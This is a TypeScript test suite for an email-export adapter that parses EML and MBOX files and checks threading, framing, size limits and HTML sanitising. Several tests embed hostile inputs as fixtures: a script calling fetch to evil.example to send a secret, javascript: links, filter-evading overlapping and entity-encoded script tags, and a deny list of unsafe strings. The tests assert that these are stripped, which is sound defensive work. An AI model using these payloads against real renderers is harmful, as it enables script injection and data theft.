import { describe, expect, test } from "bun:test";

import type { RecordAdapterInput } from "../../src/converters/types";

import { emailRecordAdapter } from "../../src/converters/adapters/email/adapter";
import { runRecordAdapter } from "../../src/ingestion/record-adapter";

const fixturePath = (name: string): string =>
  Bun.fileURLToPath(
    new URL(`../fixtures/exports/mail/${name}`, import.meta.url)
  );

const bytesInput = (
  bytes: Uint8Array,
  ext: ".eml" | ".mbox",
  overrides: Partial<RecordAdapterInput["limits"]> = {},
  chunkSize = 11
): RecordAdapterInput => ({
  sourcePath: `/private/mail/export${ext}`,
  relativePath: `export${ext}`,
  collection: "mail",
  mime: ext === ".mbox" ? "application/mbox" : "message/rfc822",
  ext,
  open: async function* () {
    for (let offset = 0; offset < bytes.length; offset += chunkSize) {
      yield bytes.subarray(offset, Math.min(offset + chunkSize, bytes.length));
    }
  },
  limits: {
    maxSourceBytes: 100_000,
    maxRecordChars: 10_000,
    maxMetadataChars: 10_000,
    maxTotalChars: 100_000,
    maxRecords: 100,
    maxFailures: 20,
    ...overrides,
  },
});

const fixtureInput = async (
  name: string,
  ext: ".eml" | ".mbox",
  chunkSize = 11
): Promise<RecordAdapterInput> => {
  const bytes = new Uint8Array(await Bun.file(fixturePath(name)).arrayBuffer());
  return bytesInput(bytes, ext, {}, chunkSize);
};

const encode = (value: string): Uint8Array => new TextEncoder().encode(value);

describe("email export adapter", () => {
  test("recognizes only explicit EML and MBOX sources", () => {
    expect(emailRecordAdapter.canHandle("message/rfc822", ".bin")).toBe(true);
    expect(emailRecordAdapter.canHandle("application/mbox", ".bin")).toBe(true);
    expect(
      emailRecordAdapter.canHandle("application/octet-stream", ".EML")
    ).toBe(true);
    expect(
      emailRecordAdapter.canHandle("application/octet-stream", ".mbox")
    ).toBe(true);
    expect(emailRecordAdapter.canHandle("text/plain", ".txt")).toBe(false);
  });

  test("preserves folded identity, thread, dates, safe body, and attachment inventory", async () => {
    const result = await runRecordAdapter(
      emailRecordAdapter,
      await fixtureInput("nested.eml", ".eml", 7)
    );

    expect(result.authoritative).toBe(true);
    expect(result.failures).toEqual([]);
    expect(result.records).toHaveLength(1);
    const message = result.records[0];
    expect(message?.title).toBe("Quarterly Überblick");
    expect(message?.sourceLocator).toBe("message:1");
    expect(message?.metadata?.author).toContain("alice@example.com");
    expect(message?.metadata?.participants).toEqual([
      '"Alice Example" <alice@example.com>',
      "Bob Example <bob@example.com>",
      "team@example.com",
    ]);
    expect(message?.metadata?.dateFields?.sentAt).toBe(
      "2026-07-21T12:30:00.000Z"
    );
    expect(message?.metadata?.threadId).toBe("root@example.com");
    expect(message?.metadata?.messageId).toBe("quarterly-1@example.com");
    expect(message?.metadata?.inReplyTo).toBe("planning@example.com");
    expect(message?.metadata?.references).toEqual([
      "root@example.com",
      "planning@example.com",
    ]);
    expect(message?.metadata?.attachments).toEqual([
      {
        name: "invoice.pdf",
        mime: "application/pdf",
        bytes: 17,
        disposition: "attachment",
        sha256:
          "6f4d87618e1531fc5af3e140c56105e655c88ab36b8e5f62c81a370b03cd5555",
      },
    ]);
    expect(message?.markdown).toContain("Der Gründungsbericht ist fertig.");
    expect(message?.markdown).toContain("sha256:");
    expect(message?.markdown).not.toContain("secret attachment");
    expect(message?.markdown).not.toContain("evil.example");
  });

  test("reduces HTML-only messages to text without retaining executable or remote attributes", async () => {
    const result = await runRecordAdapter(
      emailRecordAdapter,
      await fixtureInput("html-only.eml", ".eml")
    );
    const markdown = result.records[0]?.markdown ?? "";

    expect(result.authoritative).toBe(true);
    expect(markdown).toContain("Visible link.");
    for (const unsafe of [
      "javascript:",
      "fetch(",
      "file://",
      "tracker.example",
      "<iframe",
      "<img",
      "display: none",
    ]) {
      expect(markdown).not.toContain(unsafe);
    }
  });

  test("renders plain-text markup as inert evidence rather than active HTML, links, or images", async () => {
    const eml = [
      "From: Sender <sender@example.com>",
      "Message-ID: <plain-markup@example.com>",
      "Subject: Plain markup",
      "Content-Type: text/plain; charset=utf-8",
      "",
      "<script>alert(1)</script>",
      "[open](javascript:alert(2))",
      "![track](https://tracker.example/pixel)",
    ].join("\r\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(eml), ".eml")
    );
    const markdown = result.records[0]?.markdown ?? "";

    expect(result.authoritative).toBe(true);
    expect(markdown).toContain("\\<script\\>");
    expect(markdown).toContain("\\[open\\](javascript:alert(2))");
    expect(markdown).toContain("!\\[track\\](https://tracker.example/pixel)");
    expect(markdown).not.toContain("<script>");
    expect(markdown).not.toContain("[open](javascript:");
    expect(markdown).not.toContain("![track](");
  });

  test("escapes repeated backslashes before every Markdown control character", async () => {
    const eml = [
      "From: Sender <sender@example.com>",
      "Message-ID: <markdown-backslashes@example.com>",
      "Subject: Markdown backslashes",
      "Content-Type: text/plain; charset=utf-8",
      "",
      String.raw`\\[label](javascript:alert(1)) \\<script>`,
    ].join("\r\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(eml), ".eml")
    );
    const markdown = result.records[0]?.markdown ?? "";

    expect(markdown).toContain(
      String.raw`\\\\\[label\](javascript:alert(1)) \\\\\<script\>`
    );
    expect(markdown).not.toContain("[label](javascript:");
    expect(markdown).not.toContain("<script>");
  });

  test("streams MBOX siblings while preserving repeated and missing identities", async () => {
    const input = await fixtureInput("mixed.mbox", ".mbox", 5);
    const first = await runRecordAdapter(emailRecordAdapter, input);
    const second = await runRecordAdapter(
      emailRecordAdapter,
      await fixtureInput("mixed.mbox", ".mbox", 17)
    );

    expect(first.authoritative).toBe(false);
    expect(first.snapshotState).toBe("partial");
    expect(first.records).toHaveLength(3);
    expect(
      new Set(first.records.map((record) => record.sourceLocator))
    ).toEqual(new Set(["message:1", "message:2", "message:3"]));
    expect(new Set(first.records.map((record) => record.recordKey)).size).toBe(
      3
    );
    expect(
      first.failures.some((failure) => failure.code === "DUPLICATE_ID")
    ).toBe(false);
    expect(
      first.failures.some((failure) => failure.code === "MALFORMED_RECORD")
    ).toBe(true);
    expect(
      first.records.filter((record) =>
        record.markdown.includes("Message-ID: duplicate@example.com")
      )
    ).toHaveLength(2);
    expect(
      first.records.some((record) =>
        record.markdown.includes("content-derived identity")
      )
    ).toBe(true);
    expect(
      first.records.some((record) =>
        record.markdown.includes("Grüße aus Basel")
      )
    ).toBe(true);
    expect(second.records).toEqual(first.records);
    expect(second.failures).toEqual(first.failures);
  });

  test("keeps same-header Message-ID body variants as distinct deterministic records", async () => {
    const message = (body: string): string =>
      [
        "From sender@example.com Tue Jul 21 14:30:00 2026",
        "From: Sender <sender@example.com>",
        "Date: Tue, 21 Jul 2026 14:30:00 +0200",
        "Message-ID: <same-header@example.com>",
        "Subject: Same header",
        "Content-Type: text/plain; charset=utf-8",
        "",
        body,
      ].join("\n");
    const first = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(
        encode(`${message("first body")}\n${message("second body")}`),
        ".mbox",
        {},
        3
      )
    );
    const reordered = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(
        encode(`${message("second body")}\n${message("first body")}`),
        ".mbox",
        {},
        17
      )
    );

    expect(first.authoritative).toBe(true);
    expect(first.records).toHaveLength(2);
    expect(new Set(first.records.map((record) => record.recordKey)).size).toBe(
      2
    );
    expect(first.failures).toEqual([]);
    expect(new Set(first.records.map((record) => record.recordKey))).toEqual(
      new Set(reordered.records.map((record) => record.recordKey))
    );
  });

  test("does not split body prose on a From prefix and unescapes mboxrd body lines", async () => {
    const mailbox = [
      "From sender@example.com Tue Jul 21 14:30:00 2026",
      "From: Sender <sender@example.com>",
      "Message-ID: <body-from@example.com>",
      "Subject: Body From",
      "Content-Type: text/plain; charset=utf-8",
      "",
      "From the working group",
      ">From escaped@example.com Tue Jul 21 14:31:00 2026",
      "still the same message",
      "From next@example.com Tue Jul 21 14:32:00 2026",
      "From: Next <next@example.com>",
      "Message-ID: <next@example.com>",
      "Subject: Next",
      "Content-Type: text/plain; charset=utf-8",
      "",
      "next message",
    ].join("\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(mailbox), ".mbox", {}, 1)
    );

    expect(result.authoritative).toBe(true);
    expect(result.records).toHaveLength(2);
    const first = result.records.find((record) => record.title === "Body From");
    expect(first?.markdown).toContain("From the working group");
    expect(first?.markdown).toContain(
      "From escaped@example.com Tue Jul 21 14:31:00 2026"
    );
    expect(first?.markdown).not.toContain(">From escaped@example.com");
    expect(first?.markdown).toContain("still the same message");
  });

  test("uses Content-Length framing instead of envelope-shaped body lines", async () => {
    const body = [
      "first line",
      "From trap@example.com Tue Jul 21 14:31:00 2026",
      "still first",
      "",
    ].join("\n");
    const mailbox = [
      "From sender@example.com Tue Jul 21 14:30:00 2026",
      "From: Sender <sender@example.com>",
      "Message-ID: <content-length@example.com>",
      "Subject: Content length",
      "Content-Type: text/plain; charset=utf-8",
      `Content-Length: ${encode(body).byteLength}`,
      "",
      body +
        [
          "From next@example.com Tue Jul 21 14:32:00 2026",
          "From: Next <next@example.com>",
          "Message-ID: <content-length-next@example.com>",
          "Subject: Next",
          "Content-Type: text/plain; charset=utf-8",
          "",
          "next message",
        ].join("\n"),
    ].join("\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(mailbox), ".mbox", {}, 3)
    );

    expect(result.authoritative).toBe(true);
    expect(result.records).toHaveLength(2);
    const first = result.records.find(
      (record) => record.title === "Content length"
    );
    expect(first?.markdown).toContain(
      "From trap@example.com Tue Jul 21 14:31:00 2026"
    );
    expect(first?.markdown).toContain("still first");
  });

  test("fails closed on Content-Length that ends inside a physical line", async () => {
    const mailbox = [
      "From bad@example.com Tue Jul 21 14:30:00 2026",
      "From: Bad <bad@example.com>",
      "Message-ID: <bad-length@example.com>",
      "Subject: Bad length",
      "Content-Length: 2",
      "",
      "long body",
      "From next@example.com Tue Jul 21 14:31:00 2026",
      "From: Next <next@example.com>",
      "Message-ID: <after-bad-length@example.com>",
      "Subject: After bad length",
      "",
      "safe sibling",
    ].join("\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(mailbox), ".mbox", {}, 2)
    );

    expect(result.authoritative).toBe(false);
    expect(result.records.map((record) => record.title)).toEqual([
      "After bad length",
    ]);
    expect(result.failures[0]?.code).toBe("MALFORMED_RECORD");
  });

  test("keeps repeated Message-ID variants stable across reorder and changes identity on body edits", async () => {
    const message = (subject: string, minute: string, body: string): string =>
      [
        `From sender@example.com Tue Jul 21 14:${minute}:00 2026`,
        "From: Sender <sender@example.com>",
        `Date: Tue, 21 Jul 2026 14:${minute}:00 +0200`,
        "Message-ID: <repeated@example.com>",
        `Subject: ${subject}`,
        "Content-Type: text/plain; charset=utf-8",
        "",
        body,
      ].join("\n");
    const first = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(
        encode(
          `${message("Alpha", "30", "alpha")}\n${message("Beta", "31", "beta")}`
        ),
        ".mbox"
      )
    );
    const reordered = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(
        encode(
          `${message("Beta", "31", "beta")}\n${message("Alpha", "30", "alpha")}`
        ),
        ".mbox"
      )
    );
    const edited = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(message("Alpha", "30", "alpha edited")), ".mbox")
    );
    const keys = (records: typeof first.records): Map<string, string> =>
      new Map(records.map((record) => [record.title ?? "", record.recordKey]));

    expect(keys(reordered.records)).toEqual(keys(first.records));
    expect(keys(edited.records).get("Alpha")).not.toBe(
      keys(first.records).get("Alpha")
    );
  });

  test("supports RFC 2231 continuation parameters and multipart boundary padding", async () => {
    const eml = [
      "From: Sender <sender@example.com>",
      "Message-ID: <continued-params@example.com>",
      "Subject: Continued parameters",
      "Content-Type: multipart/mixed;",
      " boundary*0*=utf-8''gno%2D;",
      " boundary*1*=boundary",
      "",
      "--gno-boundary \t",
      "Content-Type: text/plain; charset=utf-8",
      "",
      "bounded text",
      "--gno-boundary",
      "Content-Type: application/octet-stream",
      "Content-Disposition: attachment;",
      " filename*0*=utf-8''report%20;",
      " filename*1*=final.txt",
      "Content-Transfer-Encoding: base64",
      "",
      "aGVsbG8=",
      "--gno-boundary-- \t",
    ].join("\r\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(eml), ".eml", {}, 2)
    );

    expect(result.authoritative).toBe(true);
    expect(result.records[0]?.markdown).toContain("bounded text");
    expect(result.records[0]?.metadata?.attachments?.[0]?.name).toBe(
      "report final.txt"
    );
  });

  test("drops an unclosed dangerous HTML block through end of input", async () => {
    const eml = [
      "From: Sender <sender@example.com>",
      "Message-ID: <unclosed-script@example.com>",
      "Subject: Unclosed script",
      "Content-Type: text/html; charset=utf-8",
      "",
      "<p>Visible evidence.</p>",
      "<script>fetch('https://evil.example/secret')",
      "hidden payload",
    ].join("\r\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(eml), ".eml")
    );
    const markdown = result.records[0]?.markdown ?? "";

    expect(result.authoritative).toBe(true);
    expect(markdown).toContain("Visible evidence.");
    expect(markdown).not.toContain("evil.example");
    expect(markdown).not.toContain("hidden payload");
  });

  test("drops overlapping and entity-encoded dangerous HTML without exposing payloads", async () => {
    const eml = [
      "From: Sender <sender@example.com>",
      "Message-ID: <overlapping-script@example.com>",
      "Subject: Overlapping script",
      "Content-Type: text/html; charset=utf-8",
      "",
      "<p>Visible before.</p>",
      "<scr<script>ipt>hidden overlap</scr</script>ipt>",
      "&#60;script&#62;hidden encoded&#60;/script&#62;",
      "<!-- unclosed comment <script>hidden comment</script>",
    ].join("\r\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(eml), ".eml")
    );
    const markdown = result.records[0]?.markdown ?? "";

    expect(markdown).toContain("Visible before.");
    expect(markdown).not.toContain("hidden overlap");
    expect(markdown).not.toContain("hidden encoded");
    expect(markdown).not.toContain("hidden comment");
    expect(markdown.toLowerCase()).not.toContain("<script");
  });

  test("handles a near-limit physical line delivered as one-byte chunks", async () => {
    const longBody = "x".repeat(20_000);
    const mailbox = [
      "From sender@example.com Tue Jul 21 14:30:00 2026",
      "From: Sender <sender@example.com>",
      "Message-ID: <tiny-chunks@example.com>",
      "Subject: Tiny chunks",
      "Content-Type: text/plain; charset=utf-8",
      "",
      longBody,
    ].join("\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(mailbox), ".mbox", { maxRecordChars: 25_000 }, 1)
    );

    expect(result.authoritative).toBe(true);
    expect(result.records[0]?.markdown).toContain(longBody);
  });

  test("isolates an oversized MBOX message and continues with the next sibling", async () => {
    const mailbox = [
      "From huge@example.com Tue Jul 21 14:30:00 2026",
      "From: Huge <huge@example.com>",
      "Message-ID: <huge@example.com>",
      "Subject: Huge",
      "Content-Type: text/plain; charset=utf-8",
      "",
      "x".repeat(5_000),
      "From safe@example.com Tue Jul 21 14:31:00 2026",
      "From: Safe <safe@example.com>",
      "Message-ID: <safe@example.com>",
      "Subject: Safe",
      "Content-Type: text/plain; charset=utf-8",
      "",
      "bounded sibling",
    ].join("\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(
        encode(mailbox),
        ".mbox",
        {
          maxSourceBytes: 20_000,
          maxRecordChars: 512,
          maxMetadataChars: 1_000,
        },
        37
      )
    );

    expect(result.authoritative).toBe(false);
    expect(result.records).toHaveLength(1);
    expect(result.records[0]?.markdown).toContain("bounded sibling");
    expect(
      result.failures.some((failure) => failure.code === "RECORD_TOO_LARGE")
    ).toBe(true);
  });

  test("rejects oversized attachment expansion without indexing attachment bytes", async () => {
    const encodedAttachment = Uint8Array.from(
      { length: 2_048 },
      () => 65
    ).toBase64();
    const eml = [
      "From: Sender <sender@example.com>",
      "Message-ID: <oversized-attachment@example.com>",
      "Subject: Attachment",
      'Content-Type: application/octet-stream; name="payload.bin"',
      'Content-Disposition: attachment; filename="payload.bin"',
      "Content-Transfer-Encoding: base64",
      "",
      encodedAttachment,
    ].join("\r\n");
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(encode(eml), ".eml", {
        maxRecordChars: 512,
        maxMetadataChars: 1_000,
      })
    );

    expect(result.records).toEqual([]);
    expect(result.authoritative).toBe(false);
    expect(
      result.failures.some((failure) => failure.code === "RECORD_TOO_LARGE")
    ).toBe(true);
    expect(JSON.stringify(result)).not.toContain("AAAA");
  });

  test("treats empty mail as an isolated malformed record", async () => {
    const result = await runRecordAdapter(
      emailRecordAdapter,
      bytesInput(new Uint8Array(), ".eml")
    );

    expect(result.records).toEqual([]);
    expect(result.authoritative).toBe(false);
    expect(result.failures[0]?.code).toBe("MALFORMED_RECORD");
  });
});
